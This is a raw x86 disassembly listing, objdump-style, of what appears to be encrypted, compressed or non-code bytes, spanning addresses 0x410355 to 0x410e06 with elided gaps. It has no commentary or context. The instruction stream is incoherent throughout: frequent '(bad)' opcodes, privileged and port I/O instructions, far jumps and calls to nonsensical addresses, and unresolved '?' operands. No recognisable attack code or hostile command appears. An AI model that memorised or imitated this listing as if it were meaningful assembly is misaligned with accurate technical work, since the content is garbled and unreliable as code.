  410355:	mov    ecx,0xebe1fea4
  41035a:	mov    ch,0x78
  41035c:	frndint 
  41035e:	fnstenv [edx+edx*8+0x4]
  410362:	push   eax
  410363:	or     dh,dl
  410365:	xor    eax,0x5ac1ff53
  41036a:	xor    ch,al
  41036c:	cmp    eax,0xa58eb45b
  410371:	fldcw  WORD PTR [edi+edx*8]
  410374:	adc    esp,DWORD PTR [esi]
  410376:	ret    
  410377:	add    edx,DWORD PTR [ecx+esi*1]
  41037a:	inc    esi
  41037b:	push   eax
  41037c:	inc    esi
  41037d:	jae    0x4103cf
  41037f:	push   ecx
  410380:	xchg   ecx,eax
  410381:	jge    0x4103e2
  410383:	inc    eax
  410384:	mov    dh,al
  410386:	call   0x26408776
  41038b:	fiadd  DWORD PTR [ebx+ebx*4-0x6c]
  41038f:	cld    
	...
  4103b8:	add    BYTE PTR [eax],al
  4103ba:	add    ebx,esi
  4103bc:	call   0x80fd5cc4
  4103c1:	daa    
  4103c2:	fcomp  QWORD PTR [ebx]
  4103c4:	jmp    0xf1485cfc
  4103c9:	jmp    0x41039c
  4103cb:	mov    eax,0xd361d9f5
  4103d0:	outs   dx,DWORD PTR ds:[esi]
  4103d1:	fiadd  DWORD PTR [eax-0x2f]
  4103d4:	sbb    eax,DWORD PTR [ecx-0x7a]
  4103d7:	sbb    ch,cl
  4103d9:	mov    WORD PTR [edx+0x10],?
  4103dc:	and    DWORD PTR [ebx+0x3e],eax
  4103df:	fisttp DWORD PTR ds:0x5116aa04
  4103e5:	sbb    ebx,DWORD PTR [edx+ebx*1+0x7b2630e9]
  4103ec:	dec    ebx
  4103ed:	add    al,0x3e
  4103ef:	push   eax
  4103f0:	test   eax,0x91252150
  4103f5:	bsr    edi,DWORD PTR [ebp+ebx*4+0x34]
  4103fa:	pop    bx
  4103fc:	jmp    0xbd34afe9
  410401:	gs jg  0x41045f
  410404:	sbb    ecx,ebx
  410406:	push   edx
  410407:	push   ebx
  410408:	xchg   ecx,eax
  410409:	inc    ebx
  41040a:	pushf  
  41040b:	jl     0x41040c
  41040d:	jne    0x4103e9
  41040f:	adc    bh,BYTE PTR [ecx+0x6e]
  410412:	out    0x71,eax
  410414:	add    BYTE PTR [edi-0x2bffc143],ch
  41041a:	xchg   ebx,eax
  41041b:	push   ss
  41041c:	cld    
  41041d:	sbb    al,BYTE PTR [eax]
	...
  410447:	add    BYTE PTR [edx-0x78b1013d],al
  41044d:	jge    0x410440
  41044f:	xchg   edi,eax
  410450:	cmp    dl,BYTE PTR [ebp+esi*2-0x7e]
  410454:	ja     0x41045d
  410456:	cld    
  410457:	ss stc 
  410459:	push   edx
  41045a:	call   0xfebcf0e6
  41045f:	(bad)  
  410460:	aaa    
  410461:	xchg   edx,eax
  410462:	shl    ebp,0x3d
  410465:	mov    eax,DWORD PTR es:0xb7fb98c3
  41046c:	cs icebp 
  41046e:	call   DWORD PTR [edx-0xe8b83d6]
  410474:	gs push ss
  410476:	jbe    0x41046e
  410478:	rol    WORD PTR [ebp+ebp*8-0x4e],cl
  41047d:	inc    edi
  41047e:	inc    edi
  41047f:	xor    DWORD PTR [ebp+0x5b],edi
  410482:	mov    ebx,DWORD PTR [ebx+eax*4]
  410485:	adc    eax,DWORD PTR [ecx-0x17]
  410488:	mov    ebp,0x6155003c
  41048d:	repz dec ebx
  41048f:	dec    ebx
  410490:	jge    0x4104ed
  410492:	push   edi
  410493:	rcr    DWORD PTR [edx+0x3ae8fff6],1
  410499:	fwait
  41049a:	jae    0x41046a
  41049c:	dec    edi
  41049d:	jae    0x410455
  41049f:	imul   edx,DWORD PTR [esi],0x7d
  4104a2:	dec    edi
  4104a3:	adc    DWORD PTR [edx],edi
  4104a5:	pop    ebx
  4104a6:	out    dx,eax
  4104a7:	push   edi
  4104a8:	push   ebp
  4104a9:	cmp    eax,0x2862
	...
  4104d6:	cmp    ch,BYTE PTR [ebx]
  4104d8:	inc    DWORD PTR [eax]
  4104da:	fimul  DWORD PTR [edi-0x18]
  4104dd:	ret    
  4104de:	xchg   BYTE PTR [ebx+0x1fa3e8fd],ah
  4104e4:	(bad)  
  4104e5:	(bad)  
  4104e6:	mov    esp,0x61804658
  4104eb:	push   edi
  4104ec:	jne    0x4104e8
  4104ee:	fldenv [ebx-0x5d313fcf]
  4104f4:	std    
  4104f5:	push   eax
  4104f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104f8:	lods   al,BYTE PTR ds:[esi]
  4104f9:	cmp    BYTE PTR [eax-0x350044f4],ch
  4104ff:	mov    ds:0x6f9f75fd,eax
  410504:	es jbe 0x410557
  410507:	mov    ds:0x962e5e5d,eax
  41050c:	add    al,BYTE PTR [eax]
  41050e:	stos   BYTE PTR es:[edi],al
  41050f:	into   
  410510:	jmp    0xbd00:0x68a41b83
  410517:	xor    edi,edi
  410519:	jne    0x41056a
  41051b:	outs   dx,DWORD PTR ds:[esi]
  41051c:	enter  0x5075,0xa3
  410520:	xchg   DWORD PTR [ebp+0x53],eax
  410523:	out    dx,al
  410524:	jmp    FWORD PTR [ecx+0x57]
  410527:	out    dx,eax
  410528:	pop    ebx
  410529:	bound  esp,QWORD PTR [esi+0x5f]
  41052c:	push   0x805f2700
  410531:	call   0x401be1
  410536:	sbb    al,0x9f
  410538:	jb     0x410559
	...
  410562:	add    BYTE PTR [eax],al
  410564:	aaa    
  410565:	xchg   DWORD PTR [edx-0x7e],eax
  410568:	rcl    BYTE PTR [edx+0x5f17684e],1
  41056e:	out    dx,eax
  41056f:	mov    esi,0x41622e7f
  410574:	out    0x2e,eax
  410576:	push   DWORD PTR [ebp-0x11]
  410579:	xchg   BYTE PTR [esi-0x5f],cl
  41057c:	ds rcl esi,1
  41057f:	out    0x87,eax
  410581:	dec    esp
  410582:	xlat   BYTE PTR ds:[ebx]
  410583:	(bad)  
  410584:	fnstenv [edi-0x2a]
  410587:	dec    BYTE PTR [ebx+0x6c]
  41058a:	jmp    0xfcc8:0xd6f153cb
  410591:	add    BYTE PTR [edx],0x55
  410594:	lds    edx,FWORD PTR [eax]
  410596:	add    ebx,0xffffffb2
  410599:	mov    es,WORD PTR [edx]
  41059b:	push   0x5b
  41059d:	adc    DWORD PTR [ecx+0x8],edx
  4105a0:	xchg   esi,eax
  4105a1:	xchg   esp,eax
  4105a2:	dec    edi
  4105a3:	call   FWORD PTR [ecx+0x26fc40eb]
  4105a9:	test   BYTE PTR [edx],al
  4105ab:	out    dx,eax
  4105ac:	enter  0x7a9c,0x61
  4105b0:	inc    DWORD PTR [ebx-0x3d235b96]
  4105b6:	add    bh,bh
  4105b8:	jmp    0x410625
  4105ba:	jmp    0xebfe:0xd7519f5a
  4105c1:	xlat   BYTE PTR ds:[bx]
  4105c3:	je     0x41060b
  4105c5:	dec    esp
  4105c6:	jne    0x41063c
	...
  4105f0:	add    BYTE PTR [eax],al
  4105f2:	push   ecx
  4105f3:	jns    0x4105c0
  4105f5:	rol    DWORD PTR [edx-0x7c],0x2f
  4105f9:	mov    edx,DWORD PTR [edx+0x5]
  4105fc:	sar    bl,0xa4
  4105ff:	test   BYTE PTR [eax+0x2e],ch
  410602:	xor    DWORD PTR [edi],ecx
  410604:	or     al,0xe8
  410606:	jae    0x41061f
  410608:	xlat   BYTE PTR ds:[ebx]
  410609:	(bad)  
  41060a:	mov    bh,0x3e
  41060c:	fsub   DWORD PTR [edi+0x3e]
  41060f:	test   ch,ah
  410611:	mov    ebp,0x4160e9a6
  410616:	ds sbb al,0xc0
  410619:	popa   
  41061a:	jg     0x4105a0
  41061c:	aad    0x74
  41061e:	inc    esi
  41061f:	pop    ebx
  410620:	xchg   ecx,eax
  410621:	and    ebx,DWORD PTR [edi+0x3e6b9d79]
  410627:	pop    ebx
  410628:	xchg   BYTE PTR [ebp+0x450ab559],dl
  41062e:	add    ebp,DWORD PTR ds:[ebp+0x7e5b7f61]
  410635:	push   eax
  410636:	ss sbb edi,0xffffffa4
  41063a:	sar    BYTE PTR [ecx+0x6d],0x50
  41063e:	mov    edx,0xa60bdb79
  410643:	cmp    esp,edx
  410645:	(bad)  
  410646:	test   al,0xa3
  410648:	sub    bh,bh
  41064a:	mov    eax,ds:0xbce7620e
  41064f:	sahf   
  410650:	inc    esp
  410651:	mov    ch,dl
  410653:	dec    edx
  410654:	jb     0x410647
	...
  41067e:	add    BYTE PTR [eax],al
  410680:	pop    ss
  410681:	pop    ebx
  410682:	fs inc eax
  410684:	or     BYTE PTR [edx],0x2e
  410687:	push   eax
  410688:	inc    esi
  410689:	add    eax,0x4aead6e9
  41068e:	push   ds
  41068f:	xor    DWORD PTR [edx-0x20],ecx
  410692:	sub    BYTE PTR [eax+0x19],dl
  410695:	out    0xb3,al
  410697:	xlat   BYTE PTR ds:[ebx]
  410698:	leave  
  410699:	add    al,0xe9
  41069b:	imul   edi,DWORD PTR [esi],0x3e01fe03
  4106a1:	pop    ebx
  4106a2:	test   BYTE PTR [edi+0x32],0x5
  4106a6:	out    dx,al
  4106a7:	aad    0xaf
  4106a9:	pop    edi
  4106aa:	push   ebx
  4106ab:	add    al,0xa4
  4106ad:	pop    ebx
  4106ae:	sar    DWORD PTR [ebp+0x73e95b9f],1
  4106b4:	and    bh,ch
  4106b6:	int3   
  4106b7:	in     al,dx
  4106b8:	fwait
  4106b9:	cld    
  4106ba:	call   0xecdf0dc2
  4106bf:	add    esi,DWORD PTR [ebx-0x1c]
  4106c2:	inc    esp
  4106c4:	mov    edi,0x2962fb9c
  4106c9:	dec    edi
  4106ca:	mov    edi,ebx
  4106cc:	addr16 pop ebx
  4106ce:	lea    esp,[esi+eax*1]
  4106d1:	sub    edi,edi
  4106d3:	sbb    al,0x36
  4106d5:	js     0x41074b
  4106d7:	loope  0x410740
  4106d9:	pop    ebx
  4106da:	(bad)  
  4106db:	cld    
  4106dc:	loope  0x410757
  4106de:	push   ecx
  4106df:	ror    DWORD PTR [eax-0x48],1
  4106e2:	je     0x4106b2
	...
  41070c:	add    BYTE PTR [eax],al
  41070e:	mov    dh,0xf
  410710:	cld    
  410711:	pop    ecx
  410712:	and    al,0x5b
  410714:	push   0xffffffe9
  410716:	and    eax,0x3de90278
  41071b:	js     0x410791
  41071d:	stc    
  41071e:	pop    ss
  41071f:	js     0x41071f
  410721:	fistp  DWORD PTR [ecx+0x3dd30002]
  410727:	cmp    DWORD PTR [eax-0x35],0x3d
  41072b:	pop    ebx
  41072c:	nop
  41072d:	ss icebp 
  41072f:	jbe    0x410718
  410731:	stc    
  410732:	ficomp WORD PTR [edx+0x0]
  410735:	xor    BYTE PTR [eax+ebp*2+0x0],bh
  410739:	mov    ah,0xb6
  41073b:	test   BYTE PTR [edx-0x7cee3dd3],al
  410741:	mov    WORD PTR [ebp+0x78],ss
  410744:	jae    0x410732
  410746:	or     ah,BYTE PTR [edx-0x1bc22a3f]
  41074c:	push   esp
  41074d:	fnsave [esi-0x2a5b72b6]
  410753:	daa    
  410754:	push   0xffffffe9
  410756:	or     ch,bh
  410758:	or     ebx,esi
  41075a:	js     0x4107bf
  41075c:	push   0xffffffe9
  41075e:	or     ch,bh
  410760:	adc    ecx,esi
  410762:	dec    edi
  410763:	jne    0x5269ee69
  410769:	(bad)  
  41076a:	(bad)  {k7}{z}
  41076f:	pop    esp
  410770:	mov    edx,DWORD PTR [ebp+0x0]
	...
  41079b:	add    BYTE PTR [edi-0x1d],ch
  41079e:	adc    BYTE PTR [ebp-0x72b12cde],cl
  4107a4:	and    bl,BYTE PTR [edi-0x711895b2]
  4107aa:	jae    0x410764
  4107ac:	enter  0xc29,0x83
  4107b0:	cmp    dl,bl
  4107b2:	(bad)  
  4107b3:	jae    0x4107b7
  4107b5:	loope  0x410832
  4107b7:	ror    BYTE PTR [eax+0x29],0x14
  4107bb:	push   DWORD PTR [edx+0x1837fd6b]
  4107c1:	sub    DWORD PTR [edi+edi*8],ecx
  4107c4:	xchg   edx,eax
  4107c5:	arpl   di,di
  4107c7:	push   ebp
  4107c8:	scas   eax,DWORD PTR es:[edi]
  4107c9:	mov    ?,WORD PTR ds:0xfffa67e8
  4107cf:	jmp    DWORD PTR [edi+esi*4]
  4107d2:	add    bh,bh
  4107d4:	fcmove st,st(7)
  4107d6:	jae    0x4107b8
  4107d8:	cld    
  4107d9:	aam    0x89
  4107db:	push   ebp
  4107dc:	out    dx,eax
  4107dd:	loop   0x4107ef
  4107df:	call   edx
  4107e1:	sar    ebp,cl
  4107e3:	push   edx
  4107e4:	outs   dx,DWORD PTR ds:[esi]
  4107e5:	cs leave 
  4107e7:	ret    0x5b63
  4107ea:	push   ebp
  4107eb:	mov    ebx,DWORD PTR [ebx-0x27]
  4107ee:	ret    0x39f8
  4107f1:	(bad)  
  4107f2:	std    
  4107f3:	push   edi
  4107f4:	int3   
  4107f5:	dec    eax
  4107f6:	adc    BYTE PTR [ebx-0x77c1f9b],cl
  4107fc:	sub    DWORD PTR [ebx+0x50fd],ecx
	...
  41082a:	lea    ebx,[edi-0x1]
  41082d:	jne    0x41085e
  41082f:	sbb    DWORD PTR [eax],eax
  410831:	(bad)  
  410832:	ds pop ss
  410834:	hlt    
  410835:	(bad)  
  410836:	ins    BYTE PTR es:[edi],dx
  410837:	push   0xa8bbf89
  41083c:	retf   
  41083d:	test   BYTE PTR [edx],cl
  41083f:	mov    bh,0xd2
  410841:	(bad)  
  410842:	test   BYTE PTR ds:[edx],al
  410845:	add    ch,al
  410847:	bswap  esp
  410849:	std    
  41084a:	icebp  
  41084b:	mov    ebp,0xffbb117e
  410850:	iret   
  410851:	std    
  410852:	loope  0x410821
  410854:	xor    ecx,DWORD PTR [ebp-0x12e7b3d]
  41085a:	rcl    DWORD PTR [esi+ebx*2+0x10],1
  41085e:	leave  
  41085f:	das    
  410860:	int3   
  410861:	std    
  410862:	shr    ebp,0xd2
  410865:	push   ecx
  410866:	dec    edx
  410867:	add    DWORD PTR [ecx-0x2d024f05],edx
  41086d:	jmp    FWORD PTR ds:0x3ebc815f
  410873:	or     eax,0x8f99fed3
  410878:	idiv   dh
  41087a:	or     edx,DWORD PTR [ecx+edx*8-0x2e32c58c]
  410881:	je     0x4108b9
  410883:	sbb    al,0xb
  410885:	(bad)  
  410886:	jns    0x4108cd
  410888:	xchg   esi,eax
  41088a:	dec    esi
  41088b:	cmp    eax,0xfb81
	...
  4108b8:	push   0x5d74d355
  4108bd:	pop    ecx
  4108be:	stos   DWORD PTR es:[edi],eax
  4108bf:	mov    dh,BYTE PTR [ebx+0x51fed24c]
  4108c5:	jmp    0x5cd507bf
  4108ca:	sar    dh,cl
  4108cc:	inc    ecx
  4108cd:	ins    DWORD PTR es:[edi],dx
  4108ce:	xor    al,0x8
  4108d0:	cdq    
  4108d1:	cmp    eax,esi
  4108d3:	(bad)  
  4108d5:	pop    ebx
  4108d6:	cmp    al,0x7f
  4108d8:	adc    eax,0x23cba4dc
  4108dd:	jbe    0x4108b4
  4108df:	cmp    al,ch
  4108e1:	paddusw mm7,QWORD PTR [esi+0x2f]
  4108e5:	call   0x764cd455
  4108ea:	mov    ebp,0x435b9433
  4108ef:	add    al,0xf9
  4108f1:	out    dx,eax
  4108f2:	(bad)  
  4108f4:	(bad)  
  4108f5:	xor    ebp,DWORD PTR [ebx+eax*8+0x72]
  4108f9:	stc    
  4108fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108fb:	dec    eax
  4108fc:	loop   0x410958
  4108fe:	jmp    0x620c4706
  410903:	js     0x4108ce
  410905:	je     0x41088c
  410907:	shl    BYTE PTR [eax+ecx*2+0xac2486c],cl
  41090e:	mov    BYTE PTR fs:[ebp+0x1d26d74],dh
  410915:	add    ecx,edi
  410917:	shl    dl,cl
  410919:	jb     0x410979
  41091b:	rol    BYTE PTR [eax],cl
	...
  410945:	add    BYTE PTR [eax-0x3600458b],ah
  41094b:	fxch   st(3)
  41094d:	iret   
  41094e:	xchg   ecx,eax
  41094f:	in     eax,0xbc
  410951:	es mov ebx,0x80d13cb7
  410957:	jne    0x4109b1
  410959:	shl    dl,cl
  41095b:	dec    edx
  41095c:	cs pop eax
  41095e:	inc    edx
  41095f:	jbe    0x4108fc
  410961:	sti    
  410962:	adc    BYTE PTR [ebx+0x7560d2ea],al
  410968:	imul   ecx,edx,0x400dcb49
  41096e:	push   edx
  41096f:	retf   0xe97b
  410972:	mov    ecx,0xaa7e4d81
  410977:	jb     0x410978
  410979:	test   BYTE PTR [edi],0x76
  41097c:	mov    bl,bl
  41097e:	or     al,0xb0
  410980:	mul    edi
  410982:	pcmpeqd mm7,mm6
  410985:	cmp    esp,DWORD PTR [edx]
  410987:	push   ss
  410988:	leave  
  410989:	stos   DWORD PTR es:[edi],eax
  41098a:	ds pop ebx
  41098c:	push   ebp
  41098d:	bound  ebx,QWORD PTR [esi]
  41098f:	jbe    0x410a05
  410991:	icebp  
  410992:	out    dx,al
  410993:	out    dx,eax
  410994:	pop    ss
  410995:	rcr    DWORD PTR [edx-0x17],1
  410998:	(bad)  
  410999:	mov    dh,0xf
  41099b:	lock or eax,ecx
  41099e:	push   ecx
  41099f:	cli    
  4109a0:	(bad)  
  4109a1:	call   0xa9c39e52
  4109a6:	cmp    BYTE PTR [ebx],cl
  4109a8:	call   FWORD PTR [eax+eax*1]
	...
  4109d3:	add    BYTE PTR [esi],bh
  4109d5:	je     0x410a4b
  4109d7:	icebp  
  4109d8:	cmc    
  4109d9:	aaa    
  4109da:	jb     0x410962
  4109dc:	out    dx,eax
  4109dd:	jne    0x410a53
  4109df:	aad    0xee
  4109e1:	out    dx,eax
  4109e2:	pcmpeqd mm2,QWORD PTR [ecx]
  4109e5:	push   ebx
  4109e6:	call   0xfeb515a9
  4109eb:	xor    BYTE PTR [eax+0x22b40048],al
  4109f1:	cmp    dh,0xdc
  4109f4:	xchg   ebp,eax
  4109f5:	jne    0x410a6b
  4109f7:	icebp  
  4109f8:	jne    0x410a77
  4109fa:	jo     0x410a42
  4109fc:	outs   dx,DWORD PTR ds:[esi]
  4109fd:	jne    0x410a73
  4109ff:	in     eax,dx
  410a00:	gs pop eax
  410a02:	pusha  
  410a03:	jmp    0x2e912545
  410a08:	or     DWORD PTR [edi-0x1],esp
  410a0b:	pushf  
  410a0c:	push   ebp
  410a0d:	jl     0x410a16
  410a0f:	fwait
  410a10:	mov    ?,WORD PTR [ebp-0x2]
  410a13:	pushf  
  410a14:	push   ecx
  410a15:	jne    0x410a8b
  410a17:	stc    
  410a18:	outs   dx,BYTE PTR ds:[esi]
  410a19:	out    dx,eax
  410a1a:	pop    ss
  410a1b:	add    BYTE PTR [edi],ch
  410a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a1e:	outs   dx,DWORD PTR ds:[esi]
  410a1f:	inc    DWORD PTR [eax-0x4f]
  410a22:	rcl    BYTE PTR [edi+eiz*1],0x2d
  410a26:	mov    ebp,esp
  410a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a29:	mov    ds:0x8b20f7d2,eax
  410a2e:	std    
  410a2f:	jne    0x410a70
  410a31:	hlt    
  410a32:	add    DWORD PTR [eax],0xfffffff3
  410a35:	mov    bh,ch
  410a37:	push   eax
	...
  410a60:	add    BYTE PTR [eax],al
  410a62:	add    BYTE PTR ds:0xa508e808,cl
  410a68:	std    
  410a69:	jmp    FWORD PTR [ebp+0x5f]
  410a6c:	push   0x0
  410a6e:	jg     0x4109fa
  410a70:	add    DWORD PTR [eax],eax
  410a72:	out    0xf4,eax
  410a74:	add    DWORD PTR [eax],0xffffff9f
  410a77:	mov    bh,ch
  410a79:	push   eax
  410a7a:	dec    ebp
  410a7b:	mov    bh,ch
  410a7d:	jne    0x410a56
  410a7f:	adc    eax,0x8fe76a00
  410a84:	sbb    al,0x60
  410a86:	xlat   BYTE PTR ds:[ebx]
  410a87:	push   edi
  410a88:	mov    DWORD PTR [ebp-0x26cb9],0x5797
  410a92:	fcomp  st(4)
  410a94:	repnz mul DWORD PTR [eax]
  410a97:	mov    eax,DWORD PTR [eax]
  410a99:	add    BYTE PTR [edi-0x107a38a9],dl
  410a9f:	xchg   edx,eax
  410aa0:	std    
  410aa1:	jmp    DWORD PTR [edi+0x58000057]
  410aa7:	(bad)  
  410aa9:	test   DWORD PTR [eax-0x75],0x5767fffe
  410ab0:	mov    edx,DWORD PTR [ebp-0x71]
  410ab3:	not    BYTE PTR [eax]
  410ab5:	push   0x57
  410ab7:	hlt    
  410ab8:	xor    eax,0x48
  410abb:	mov    edi,ebp
  410abd:	push   eax
  410abe:	inc    DWORD PTR ds:[ebp-0x2f9bb615]
  410ac5:	dec    edi
	...
  410aee:	add    BYTE PTR [eax],al
  410af0:	mov    ebx,0x41f6db06
  410af5:	je     0x410b28
  410af7:	push   DWORD PTR [ebx+0x4274cf94]
  410afd:	adc    DWORD PTR [eax+ecx*1-0x6c],0x4674cd84
  410b05:	xchg   ecx,eax
  410b06:	xor    DWORD PTR [ebp+edi*4-0x39],eax
  410b0a:	fcomi  st,st(6)
  410b0c:	adc    DWORD PTR [edx+0x78c20f03],esp
  410b12:	add    eax,DWORD PTR [eax]
  410b14:	ds add eax,0xa9f1eb91
  410b1a:	into   
  410b1b:	inc    DWORD PTR [eax-0x8]
  410b1e:	inc    BYTE PTR [eax]
  410b20:	ds test ch,al
  410b23:	test   BYTE PTR [edx],cl
  410b25:	retf   0xfece
  410b28:	ds test ch,bl
  410b2b:	mov    ebp,0x4161b566
  410b30:	ds out 0x88,eax
  410b33:	inc    ebp
  410b35:	icebp  
  410b36:	into   
  410b37:	dec    edi
  410b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b39:	shr    BYTE PTR [esi],0x0
  410b3c:	ds test ebx,0x8940fc73
  410b43:	shr    DWORD PTR [ecx+0x3e00cf11],cl
  410b49:	sbb    DWORD PTR [esi+0x43a69b67],ecx
  410b4f:	add    BYTE PTR [ebx+0xfc03ff],bh
	...
  410b7d:	add    BYTE PTR [ecx-0x5c17cbcf],al
  410b83:	leave  
  410b84:	add    al,BYTE PTR [eax]
  410b86:	mov    ebx,0x81235844
  410b8b:	pop    ebx
  410b8c:	ins    BYTE PTR es:[edi],dx
  410b8d:	mov    eax,0x21d7268
  410b92:	adc    BYTE PTR ds:[esi+0x5c],0x53
  410b97:	std    
  410b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b99:	add    edi,DWORD PTR [ebx+0x40cfe8d8]
  410b9f:	jb     0x410b39
  410ba1:	fcmovnb st,st(3)
  410ba3:	adc    ecx,ebp
  410ba5:	add    edi,DWORD PTR [ebx-0x23772266]
  410bab:	pop    edx
  410bac:	jmp    0x4a8da1b4
  410bb1:	inc    ebp
  410bb2:	ds loopne 0x410c20
  410bb5:	add    edx,DWORD PTR [esi]
  410bb7:	jb     0x410b86
  410bb9:	xor    edx,DWORD PTR [esi]
  410bbb:	add    al,0x49
  410bbd:	add    al,0x3e
  410bbf:	test   ax,0x6f57
  410bc3:	fdivrp st(3),st
  410bc5:	jo     0x410b4b
  410bc7:	sbb    al,0xe9
  410bc9:	add    edi,DWORD PTR [ecx]
  410bcb:	xlat   BYTE PTR ds:[ebx]
  410bcc:	add    edi,DWORD PTR ds:0x9e5b
  410bd1:	cwde   
  410bd2:	loope  0x410c3d
  410bd4:	xchg   ebp,eax
  410bd5:	into   
  410bd6:	rcl    bh,0x88
  410bd9:	(bad)  
  410bda:	enter  0x8571,0x98
  410bde:	aad    0x69
  410be0:	jge    0x410bb0
	...
  410c0a:	add    BYTE PTR [eax],al
  410c0c:	enter  0x8cd7,0xd6
  410c10:	mov    al,0x71
  410c12:	pop    ebx
  410c13:	mov    BYTE PTR [ecx-0xe319a97],dl
  410c19:	add    al,0xe8
  410c1b:	pop    ecx
  410c1c:	ds add eax,0x53e59e9
  410c22:	jmp    0x3dbbcea7
  410c27:	into   
  410c28:	or     BYTE PTR [edx],0x3e
  410c2b:	clc    
  410c2c:	fisub  DWORD PTR ds:0x663da800
  410c32:	shl    BYTE PTR [ebp-0x28b8e00],0x70
  410c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c3a:	xlat   BYTE PTR ds:[ebx]
  410c3b:	push   ss
  410c3c:	mov    BYTE PTR [eax-0x2],dh
  410c3f:	pop    esp
  410c40:	mov    eax,ds:0x780efe68
  410c45:	out    0xf,al
  410c47:	push   es
  410c48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c49:	(bad)  
  410c4a:	idiv   dh
  410c4c:	or     edi,DWORD PTR [ecx+0xf]
  410c4f:	test   DWORD PTR [ebx],0xd934fe72
  410c55:	imul   edi,esi,0x5e0302e6
  410c5b:	jmp    0xd65d909d
  410c60:	imul   eax,DWORD PTR [edi-0x1],0xfe69ea94
  410c67:	(bad)  
  410c68:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c6a:	jmp    0x410c22
  410c6c:	or     esi,DWORD PTR [edx-0x2]
  410c6f:	cmp    al,0x0
	...
  410c99:	add    dl,ch
  410c9b:	jno    0x410c51
  410c9d:	xchg   ebp,eax
  410c9e:	adc    esi,DWORD PTR [edx-0x2]
  410ca1:	xchg   ecx,eax
  410ca2:	fsubr  DWORD PTR [edi-0x2]
  410ca5:	sahf   
  410ca6:	or     ebp,DWORD PTR [eax+0x72039eeb]
  410cac:	out    0x9,eax
  410cae:	sbb    ebx,DWORD PTR [ebx+0x0]
  410cb1:	mov    al,0xfc
  410cb3:	dec    esp
  410cb4:	add    BYTE PTR [edi+esi*1],dl
  410cb7:	test   BYTE PTR [edx-0xf93553],al
  410cbd:	hlt    
  410cbe:	test   eax,0x3dc60a78
  410cc3:	pop    ebx
  410cc4:	or     ebp,DWORD PTR [ecx]
  410cc6:	icebp  
  410cc7:	push   ebp
  410cc8:	pop    esi
  410cc9:	and    BYTE PTR [esp+eiz*2+0x0],bh
  410ccd:	cmp    BYTE PTR [edx-0x6aff4023],ah
  410cd3:	repz into 
  410cd5:	lea    esp,[edx+0x28524e90]
  410cdb:	or     BYTE PTR [eax+ebp*8],cl
  410cde:	dec    esi
  410cdf:	lock std 
  410ce1:	dec    DWORD PTR [ebp+esi*4-0x6decb279]
  410ce8:	or     BYTE PTR [esi],dh
  410cea:	pop    eax
  410ceb:	mov    BYTE PTR [edx+0x29],0x4b
  410cef:	pop    ebp
  410cf0:	inc    ebp
  410cf1:	aam    0x96
  410cf3:	fcomi  st,st(7)
  410cf5:	adc    al,0xb5
  410cf7:	lea    ebp,[ecx]
  410cf9:	neg    BYTE PTR [esi+0xebd008]
	...
  410d27:	add    bh,bh
  410d29:	inc    ebp
  410d2a:	movzx  edx,BYTE PTR [ebx+0x51]
  410d2e:	in     al,dx
  410d2f:	push   eax
  410d30:	outs   dx,DWORD PTR ds:[esi]
  410d31:	xor    BYTE PTR [ebx+0x41],ah
  410d34:	daa    
  410d35:	icebp  
  410d36:	inc    ebx
  410d37:	fadd   DWORD PTR [edi-0x71]
  410d3a:	push   cs
  410d3b:	pop    edi
  410d3c:	pop    ss
  410d3d:	pop    esp
  410d3e:	add    esp,0xffffffeb
  410d41:	lock inc ebx
  410d43:	fcom   DWORD PTR [edi-0x62]
  410d46:	jae    0x410d18
  410d48:	inc    ecx
  410d4a:	je     0x410d4b
  410d4c:	cwde   
  410d4d:	hlt    
  410d4e:	inc    ebx
  410d4f:	shl    BYTE PTR [ecx],1
  410d51:	(bad)  
  410d53:	adc    al,0x35
  410d55:	stos   BYTE PTR es:[edi],al
  410d56:	jg     0x410dbd
  410d58:	xchg   ebx,eax
  410d59:	sahf   
  410d5a:	(bad)  
  410d5b:	call   edi
  410d5d:	sahf   
  410d5e:	jae    0x410d34
  410d60:	dec    edi
  410d61:	xor    BYTE PTR [ebx+0x41],ah
  410d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d65:	lock inc ebx
  410d67:	fadd   DWORD PTR [edi-0x71]
  410d6a:	ficomp WORD PTR [esi-0x69]
  410d6d:	pop    ebx
  410d6e:	add    esp,0xffffffab
  410d71:	lock inc ebx
  410d73:	fdivr  DWORD PTR [esi]
  410d75:	mov    dl,0xcb
  410d77:	je     0x410de7
  410d79:	sbb    DWORD PTR [ecx+0x7a188175],ebx
  410d7f:	inc    esp
  410d80:	mov    ?,esi
  410d82:	inc    ebp
  410d83:	int3   
  410d84:	push   cs
  410d85:	sub    DWORD PTR [esi-0x30],edx
  410d88:	(bad)  
  410d89:	rcr    DWORD PTR [edi+0x41],cl
	...
  410db4:	add    BYTE PTR [eax],al
  410db6:	cmp    DWORD PTR ds:[esi],edx
  410db9:	ret    
  410dba:	push   es
  410dbb:	ret    
  410dbc:	add    ch,al
  410dbe:	mov    ecx,esi
  410dc0:	retf   
  410dc1:	(bad)  
  410dc2:	xor    eax,0xa983fc42
  410dc7:	add    DWORD PTR [edx],0xbab7c700
  410dcd:	xor    BYTE PTR [ebx-0x3df0fcc8],0x2
  410dd4:	add    eax,DWORD PTR [eax]
  410dd6:	ds jne 0x410e29
  410dd9:	or     al,0x26
  410ddb:	aaa    
  410ddc:	sub    al,BYTE PTR [eax]
  410dde:	ds mov bl,0xe3
  410de1:	cmp    dh,0x82
  410de4:	jnp    0x410e2a
  410de6:	into   
  410de7:	xchg   ebp,eax
  410de8:	push   eax
  410de9:	or     al,0xc9
  410deb:	aaa    
  410dec:	nop
  410ded:	(bad)  
  410dee:	imul   edi,DWORD PTR [eax-0x4201bb86],0x50
  410df5:	enter  0x3fb1,0xc0
  410df9:	mov    BYTE PTR [ebx+0x3e000410],0x84
  410e00:	test   DWORD PTR [ebx+ebp*4],edi
  410e03:	cmp    DWORD PTR [ebp+0x0],eax
  410e06:	ds jo  0x410e3b
